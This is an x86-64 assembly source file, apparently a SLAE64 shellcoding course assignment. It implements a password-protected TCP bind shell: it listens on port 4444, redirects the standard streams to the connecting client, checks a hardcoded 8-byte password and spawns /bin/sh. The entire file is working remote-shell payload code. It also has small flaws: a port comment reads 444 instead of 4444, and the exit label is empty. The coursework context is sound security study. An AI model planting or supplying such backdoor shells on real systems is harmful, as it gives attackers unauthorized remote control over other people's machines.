; Author: Guillem Alminyana
; Student ID: PA-14628
; SLAE64 Assignment #1: Shell_Bind_TCP
; =====================================
;
; Compile: 
;   nasm -f elf64 BindShell-Execve-Stack.nasm -o BindShell-Execve-Stack.o 
; Link: Use the -N option, to  access memory positions in the .text 
;       section instead of .data 


%define AF_INET 2
%define SOCK_STREAM 1
%define INADDR_ANY 0
%define PORT 0x5c11				; Port 444 (htons(4444))

global _start

section .text

_start:
	
	jmp real_start
	PASSWD_PROMPT: db "Passwd: "
	PASSWD_INPUT: db "AAAAAAAA"

real_start:
	; sock = socket(AF_INET, SOCK_STREAM, 0)

	mov rax, 41			; syscall number
	mov rdi, AF_INET		; IPv4
	mov rsi, SOCK_STREAM		; TCP connection
	mov rdx, 0			; IP Protocol
	syscall

	; Save the socket_id value in RDI for future use
	
	mov rdi, rax 			; value returned in RAX by syscall

	; Prepare (struct sockaddr *)&server
	;	RSP will point to the struct address
	
	xor rax, rax
	push rax			; bzero(&server.sin_zero, 8)

	mov dword [rsp - 4], INADDR_ANY
	mov word [rsp - 6], PORT
	mov word [rsp - 8], AF_INET

	sub rsp, 8 			; Update RSP with right value
	
	; bind(sock, (struct sockaddr *)&server, sockaddr_len)
	;	RDI already has the sock_id
	
	mov rax, 49			; syscall number
	mov rsi, rsp			; @ to (struct sockaddr * &server)
	mov rdx, 16			; length of the sockaddr struct
	syscall

	; listen(sock, MAX_CLIENTS)
	;	RDI already has the sock_id
	
	mov rax, 50			; syscall number
	mov rsi, 2
	syscall

	; client_sock = accept(sock_id, (struct sockaddr *)&client, &sockaddr_len)
	; 	RDI already has the sock_id

	mov rax, 43			; syscall number
	
	;	Reserve space on the stack for the struct (16 bytes)

	sub rsp, 16			; Reserved 16 bytes
	mov rsi, rsp			; RSI <- @ sockaddr struct

	;	Store in the Stack the sockaddr_len value

	mov byte [rsp - 1], 16		; Stored the len (16 bytes)
	sub rsp, 1			; Update value for RSP
	mov rdx, rsp			; RDX <- @sockaddr_len
	syscall

	; Store the client socket descripion returned by accept

	mov rbx, rax			; rbx <- client_sock

	; Close the parent socket_id

	mov rax, 3			; syscall number
	syscall				

	; Sockets duplication

	mov rdi, rbx			; Client socket descriptor

	mov rax, 33			; syscall number
	mov rsi, 0
	syscall

	mov rax, 33
	mov rsi, 1
	syscall

	mov rax, 33
	mov rsi, 2
	syscall

	; execve

password_check:

write_syscall:

	mov rax, 1			; Syscall number for write()
	mov rdi, 1			
	lea rsi, [rel PASSWD_PROMPT]	; Rel addressing for the string with the "Passwd:" prompt
	mov rdx, 8			; length of the string
	syscall

read_syscall:

	xor rax, rax			; Syscall number for read()
	mov rdi, 0
	lea rsi, [rel PASSWD_INPUT]	; Rel addressing fore the string where to store input
	mov rdx, 8			; Max length of the input allowed
	syscall

compare_passwords:

	mov rax, "12345678"		; This is the password
	lea rdi, [rel PASSWD_INPUT]
	scasq				; Compare the qword for passwords
	jnz exit_program		; Passwords dont match, we exit

execve_syscall:

	; First NULL push
	xor rax, rax
	push rax

	; push /bin//sh in reverse
	mov rbx, 0x68732f2f6e69622f
	push rbx

	; store /bin//sh address in RDI
	mov rdi, rsp

	; Second NULL push
	push rax

	; set RDX
	mov rdx, rsp


	; Push address of /bin//sh
	push rdi

	; set RSI

	mov rsi, rsp

	; Call the Execve syscall
	add rax, 59
	syscall
	
exit_program:





























